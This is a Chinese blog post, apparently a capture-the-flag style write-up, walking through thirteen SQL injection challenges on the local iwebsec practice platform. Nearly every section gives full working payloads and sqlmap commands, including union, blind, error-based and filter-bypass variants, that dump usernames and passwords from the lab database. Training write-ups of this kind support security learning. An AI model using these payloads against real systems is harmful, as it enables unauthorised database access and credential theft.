# iwebsec刷题记录-SQL注入漏洞

阅读量 **348503**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-07-10 11:00:06

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t0156ed781c2b218752.jpg)

被推荐了这个web平台，感觉挺适合新手的，网上搜了下没看到有人写wp，这里本入门萌新来稍微整理下自己解题的过程

![](https://i.imgur.com/2TLVgYs.png)

## SQL注入漏洞

###  01-数字型注入

`http://localhost:32774/sqli/01.php?id=1'`  
发现有报错

> You have an error in your SQL syntax; check the manual that corresponds to
> your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at
> line 1

猜测语句  
`WHERE id=$id LIMIT 0,1`  
验证一下

![](https://i.imgur.com/nU4A5wT.png)

![](https://i.imgur.com/C6z7kYx.png)

查列数

![](https://i.imgur.com/1jd4sfY.png)

查显示位

  
爆库  
`http://localhost:32774/sqli/01.php?id=1%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata%20--+`

![](https://i.imgur.com/RwAjEOc.png)

爆表  
`http://localhost:32774/sqli/01.php?id=1%20union%20select%201,2,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())%20--+`

![](https://i.imgur.com/OOurtt3.png)

爆列  
`http://localhost:32774/sqli/01.php?id=1%20union%20select%201,2,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema%20=database()%20and%20table_name=%27users%27)%20--+`

![](https://i.imgur.com/CFOAAuq.png)

爆数据  
`http://localhost:32774/sqli/01.php?id=1%20union%20select%201,2,(select%20group_concat(concat(role,0x7e,username,0x3A,password,0x7e))%20from%20users)%20%20--+`

![](https://i.imgur.com/MJrld9O.png)

###  02-字符型注入

`http://localhost:32774/sqli/02.php?id=1' or '1=2–'`  
报错

> You have an error in your SQL syntax; check the manual that corresponds to
> your MySQL server version for the right syntax to use near ‘’1’ or ’1=2–’’
> LIMIT 0,1’ at line 1

看源码，发现`SET NAMES gbk`猜测宽字节注入  
尝试  
`http://localhost:32774/sqli/02.php?id=1%df' and 1=2 union select 1,2,3 --+`

![](https://i.imgur.com/neb1Mhn.png)

爆库  
`http://localhost:32774/sqli/02.php?id=1%df' and 1=2 union select
1,2,group_concat(schema_name) from information_schema.schemata --+`

![](https://i.imgur.com/8RLVztu.png)

爆表  
`http://localhost:32774/sqli/02.php?id=1%df' and 1=2 union select 1,2,(select
group_concat(table_name) from information_schema.tables where
table_schema=database()) --+`

![](https://i.imgur.com/mwWiBkz.png)

爆数据  
`http://localhost:32774/sqli/02.php?id=1%df' and 1=2 union select 1,2,(select
group_concat(concat(role,0x7e,username,0x3A,password,0x7e)) from users) --+`

![](https://i.imgur.com/iSeUu27.png)

这里除了前面通过宽字节来让mysql以为是个汉字绕过检查其他和第一题一样

###  03-bool注入

`http://localhost:32774/sqli/03.php?id=1 and 1=2 --+`

![](https://i.imgur.com/Io0BOq1.png)

![](https://i.imgur.com/yWR4Cat.png)

检测出来存在是布尔注入就懒得写jio本了，sqlmap直接梭  
爆库  
`sqlmap -u http://localhost:32774/sqli/03.php?id=1 --current-db`

![](https://i.imgur.com/vglIeLB.png)

爆表  
`sqlmap -u http://localhost:32774/sqli/03.php?id=1 -D iwebsec --tables`

![](https://i.imgur.com/jYQAAPL.png)

爆列  
`sqlmap -u http://localhost:32774/sqli/03.php?id=1 -D iwebsec -T users
--columns`

![](https://i.imgur.com/yYzBFEZ.png)

爆数据  
`sqlmap -u http://localhost:32774/sqli/03.php?id=1 -D iwebsec -T users -C
role,username,password --dump`

![](https://i.imgur.com/3TodsIs.png)

###  04-sleep注入

自己的脚本真的很丑，这里就不丢脸了  
时间盲注爆库  
`sqlmap -u http://localhost:32774/sqli/04.php?id=1 -p id --technique T --time-sec 3 --current-db`

![](https://i.imgur.com/Slwde4N.png)

爆表  
`sqlmap -u http://localhost:32774/sqli/04.php?id=1 -p id --technique T --time-sec 3 -D iwebsec --tables`

![](https://i.imgur.com/T9KH3ub.png)

爆列  
`sqlmap -u http://localhost:32774/sqli/04.php?id=1 -p id --technique T --time-sec 3 -D iwebsec -T user --columns`

![](https://i.imgur.com/2AP4Xij.png)

爆数据  
`sqlmap -u http://localhost:32774/sqli/04.php?id=1 -p id --technique T --time-sec 3 -D iwebsec -T user -C id,password,username --dump`

![](https://i.imgur.com/32bhAsK.png)

###  05-updatexml注入

这题限制条件没弄好，用第一题的payload都能跑  
但还是用题目的预期过一遍  
`and (updatexml(1,concat(0x7e,(select version()),0x7e),1))`

先检验  
`http://localhost:32774/sqli/05.php?id=1 and (updatexml(1,concat(0x7e,(select
version()),0x7e),1))`  
存在注入，并使用updatexml函数注入  
爆库  
`http://localhost:32774/sqli/05.php?id=1 and (updatexml(1,concat(0x7e,(select
group_concat(schema_name) from information_schema.schemata),0x7e),1))`

![](https://i.imgur.com/N9tXlw6.png)

爆表  
`http://localhost:32774/sqli/05.php?id=1 and (updatexml(1,concat(0x7e,(select
(select group_concat(table_name) from information_schema.tables where
table_schema=database())),0x7e),1))`

![](https://i.imgur.com/eXgwFF1.png)

爆列  
`http://localhost:32774/sqli/05.php?id=1 and (updatexml(1,concat(0x7e,(select
(select group_concat(column_name) from information_schema.columns where
table_schema =database() and table_name='users')),0x7e),1))`

![](https://i.imgur.com/6maw524.png)

爆数据  
`http://localhost:32774/sqli/05.php?id=1 and (updatexml(1,concat(0x7e,(select
(select group_concat(concat(role,0x7e,username,0x3A,password,0x7e)) from
users)),0x7e),1))`

![](https://i.imgur.com/0gR4gPH.png)

###  06-宽字节注入

这题看题目就是宽字节，和之前第二题的做法重了，就换个方法，用sqlmap过一遍  
这里需要知道的是直接  
`sqlmap -u http://localhost:32774/sqli/06.php?id=1`  
是找不到注入的,需要  
`sqlmap -u http://localhost:32774/sqli/06.php?id=1%df%27`  
或者使用tamper=”unmagicquotes”  
`sqlmap -u "http://localhost:32774/sqli/06.php?id=1" --tamper="unmagicquotes"
--current-db`  
爆库  
`sqlmap -u "http://localhost:32774/sqli/06.php?id=1" --tamper="unmagicquotes"
--current-db`  
爆表  
`sqlmap -u "http://localhost:32774/sqli/06.php?id=1" --tamper="unmagicquotes"
-D iwebsec --tables`  
爆列  
`sqlmap -u "http://localhost:32774/sqli/06.php?id=1" --tamper="unmagicquotes"
-D iwebsec -T users --colums`  
爆数据  
`sqlmap -u "http://localhost:32774/sqli/06.php?id=1" --tamper="unmagicquotes"
-D iwebsec -T users -C role,username,password --dump`

![](https://i.imgur.com/tAvrnc5.png)

###  07-空格过滤绕过

看题可知过滤了空格，这里我选择用括号让参数之间没有空格  
`http://localhost:32774/sqli/07.php?id=(0)or(1)=(1)`

![](https://i.imgur.com/3NPhIKF.png)

查显示位  
`http://localhost:32774/sqli/07.php?id=(0)%0aunion%0aselect(1),(2),(3)`

![](https://i.imgur.com/1EzrMNh.png)

爆库  
`http://localhost:32774/sqli/07.php?id=(0)%0Aunion%0Aselect(1),(2),(select%0Agroup_concat(schema_name)%0Afrom%0Ainformation_schema.schemata)`

![](https://i.imgur.com/OyRtvFf.png)

爆表  
`localhost:32774/sqli/07.php?id=(0)%0Aunion%0Aselect(1),(2),(select%0Agroup_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database())`

![](https://i.imgur.com/zlm8wxq.png)

爆列  
`http://localhost:32774/sqli/07.php?id=(0)%0Aunion%0Aselect(1),(2),(select%0Agroup_concat(column_name)%0Afrom%0Ainformation_schema.columns%0awhere%0atable_schema=database()and(table_name='users'))`

![](https://i.imgur.com/J6HLauy.png)

爆数据  
`http://localhost:32774/sqli/07.php?id=(0)%0Aunion%0Aselect(1),(2),(select%0Agroup_concat(concat(role,0x7e,username,0x3A,password,0x7e))%0Afrom%0Ausers)`

![](https://i.imgur.com/QgOMgVX.png)

###  08-大小写过滤绕过

常规测试后发现测试点在select上，根据题目只要对select进行大小写变换就行  
显示位

![](https://i.imgur.com/GCXsYV5.png)

![](https://i.imgur.com/uU3rn8G.png)

爆库  
`http://localhost:32774/sqli/08.php?id=1 union Select
1,2,group_concat(schema_name) from information_schema.schemata--+`

![](https://i.imgur.com/uyTWxtT.png)

爆表  
`http://localhost:32774/sqli/08.php?id=1 union Select 1,2,(Select
group_concat(table_name) from information_schema.tables where
table_schema=database())--+`

![](https://i.imgur.com/ZJfbxae.png)

爆列  
`http://localhost:32774/sqli/08.php?id=1 union Select 1,2,(Select
group_concat(column_name) from information_schema.columns where table_schema
=database() and table_name='users')--+`

![](https://i.imgur.com/zaD1FxP.png)

爆数据  
`http://localhost:32774/sqli/08.php?id=1 union Select 1,2,(Select
group_concat(concat(role,0x7e,username,0x3A,password,0x7e)) from users)--+`

![](https://i.imgur.com/qXIASOo.png)

###  09-双写关键字绕过

![](https://i.imgur.com/JS8MwfS.png)

确认存在注入  
发现过滤了select字符串，题目可得需要用双写来绕过，试一下  
`http://localhost:32774/sqli/09.php?id=1 union seselectlect 1,2,3--+`  
绕过的原因

> 因为在匹配到”se”+”select”+”lect”中的select后替换为空后前后拼接起来就是select成功的绕过唯一一次检验

爆库  
`http://localhost:32774/sqli/09.php?id=1 union seselectlect
1,2,group_concat(schema_name) from information_schema.schemata--+`

![](https://i.imgur.com/xN9btx9.png)

爆表  
`http://localhost:32774/sqli/09.php?id=1 union seselectlect 1,2,(seselectlect
group_concat(table_name) from information_schema.tables where
table_schema=database())--+`

![](https://i.imgur.com/itA3jg5.png)

爆列  
`http://localhost:32774/sqli/09.php?id=1 union seselectlect 1,2,(seselectlect
group_concat(column_name) from information_schema.columns where table_schema
=database() and table_name='users')--+`

![](https://i.imgur.com/BThbM41.png)

爆数据  
`http://localhost:32774/sqli/09.php?id=1 union seselectlect 1,2,(seselectlect
group_concat(concat(role,0x7e,username,0x3A,password,0x7e)) from users)--+`

![](https://i.imgur.com/wCf098S.png)

###  10-双重url编码绕过

根据题目可以猜到源码对$id进行了一次urldecode，在测试的过程中还能发现对select进行了waf，所以只需要根据第八题的payload进行两次urlencode即可  
脚本

    
    
    a = ""
    print urllib.quote(urllib.quote(a))
    

本以为是这样的  
结果完全没派上用场，第八题的语句完全照搬都能跑得通

![](https://i.imgur.com/EfwE9WM.png)

但出于对题目的尊重还是用双重url编码绕过一下吧

爆库

> 原句  
> `1 union Select 1,2,group_concat(schema_name) from
> information_schema.schemata#`  
>  编码后  
>
> `1%2520union%2520Select%25201%252C2%252Cgroup_concat%2528schema_name%2529%2520from%2520information_schema.schemata%2523`  
>  最终  
>
> `http://localhost:32774/sqli/10.php?id=1%2520union%2520Select%25201%252C2%252Cgroup_concat%2528schema_name%2529%2520from%2520information_schema.schemata%2523`

![](https://i.imgur.com/Wi6ug1x.png)

爆表

> 原句  
> `1 union Select 1,2,(Select group_concat(table_name) from
> information_schema.tables where table_schema=database())#`  
>  编码后  
>
> `1%2520union%2520Select%25201%252C2%252C%2528Select%2520group_concat%2528table_name%2529%2520from%2520information_schema.tables%2520where%2520table_schema%253Ddatabase%2528%2529%2529%2523`  
>  最终  
>
> `http://localhost:32774/sqli/10.php?id=1%2520union%2520Select%25201%252C2%252C%2528Select%2520group_concat%2528table_name%2529%2520from%2520information_schema.tables%2520where%2520table_schema%253Ddatabase%2528%2529%2529%2523`  
>

爆列

> 原句  
> `1 union Select 1,2,(Select group_concat(column_name) from
> information_schema.columns where table_schema =database() and
> table_name='users')#`  
>  编码后  
>
> `1%2520union%2520Select%25201%252C2%252C%2528Select%2520group_concat%2528column_name%2529%2520from%2520information_schema.columns%2520where%2520table_schema%2520%253Ddatabase%2528%2529%2520and%2520table_name%253D%2527users%2527%2529%2523`  
>  最终  
>
> `http://localhost:32774/sqli/10.php?id=1%2520union%2520Select%25201%252C2%252C%2528Select%2520group_concat%2528column_name%2529%2520from%2520information_schema.columns%2520where%2520table_schema%2520%253Ddatabase%2528%2529%2520and%2520table_name%253D%2527users%2527%2529%2523`  
>

爆数据

> 原句  
> `1 union Select 1,2,(Select
> group_concat(concat(role,0x7e,username,0x3A,password,0x7e)) from users) #`  
>  编码后  
>
> `1%2520union%2520Select%25201%252C2%252C%2528Select%2520group_concat%2528concat%2528role%252C0x7e%252Cusername%252C0x3A%252Cpassword%252C0x7e%2529%2529%2520from%2520users%2529%2520%2523`  
>  最终  
>
> `http://localhost:32774/sqli/10.php?id=1%2520union%2520Select%25201%252C2%252C%2528Select%2520group_concat%2528concat%2528role%252C0x7e%252Cusername%252C0x3A%252Cpassword%252C0x7e%2529%2529%2520from%2520users%2529%2520%2523`  
>

###  11-十六进制绕过

先按正常步骤去做  
查显示位  
`http://localhost:32774/sqli/11.php?id=1%20union%20select%201,2,3--+`  
爆库  
`localhost:32774/sqli/11.php?id=1 union select 1,2,group_concat(schema_name)
from information_schema.schemata--+`  
爆表  
`localhost:32774/sqli/11.php?id=1 union select 1,2,(select
group_concat(table_name) from information_schema.tables where
table_schema=database())--+`  
查列的时候问题就来了，发现引号被过滤了

![](https://i.imgur.com/auwKlp7.png)

这里就考虑到使用user的十六进制绕过限制

![](https://i.imgur.com/zMTIPTN.png)

爆列  
`http://localhost:32774/sqli/11.php?id=1 union select 1,2,(select
group_concat(column_name) from information_schema.columns where table_schema
=database() and table_name=0x75736572)--+`

![](https://i.imgur.com/sPf6dfC.png)

爆数据  
`http://localhost:32774/sqli/11.php?id=1 union select 1,2,(select
group_concat(concat(id,0x7e,username,0x3A,password,0x7e)) from user) --+`

![](https://i.imgur.com/dufJ9EW.png)

###  12-等价函数替换过滤绕过

简单尝试后可知对等号进行了waf，那么爆库的语句还是正常的  
`http://localhost:32774/sqli/12.php?id=1 union select
1,2,group_concat(schema_name) from information_schema.schemata--+`  
这里就根据题目，使用与等号等价的函数进行替换，这里我选择用like，因为如果没有使用百分号,like子句与等号的效果是一样的  
爆表  
`http://localhost:32774/sqli/12.php?id=1 union select 1,2,(select
group_concat(table_name) from information_schema.tables where table_schema
like database())--+`  
爆列  
`http://localhost:32774/sqli/12.php?id=1 union select 1,2,(select
group_concat(column_name) from information_schema.columns where table_schema
like database() and table_name like 'users')--+`

![](https://i.imgur.com/lad6RqB.png)

爆数据  
`http://localhost:32774/sqli/12.php?id=1 union select 1,2,(select
group_concat(concat(role,0x7e,username,0x3A,password,0x7e)) from users) --+`

###  13-二次注入

这题其实挺简单的，简单的整理下流程  
1.注册用户，输入username，password，email  
2.找回密码，输入存在的邮箱即可返回用户名和密码  
那么问题来了，这是一道注入题，从注入的角度来说应该是在username放入查询语句再通过找回密码来执行  
但由于我很懒，我选择直接用万能密码法

![](https://i.imgur.com/3a8GqZW.png)

![](https://i.imgur.com/r9qJxVf.png)

这样就会使查询语句查的是admin而不是`admin'#`

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **悲离赋** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/210169](/post/id/210169)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [Web安全](/tag/Web安全)

 **+1** __4赞

 __收藏

![](https://p4.ssl.qhimg.com/t01b82eb3eba810438e.png) 悲离赋

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

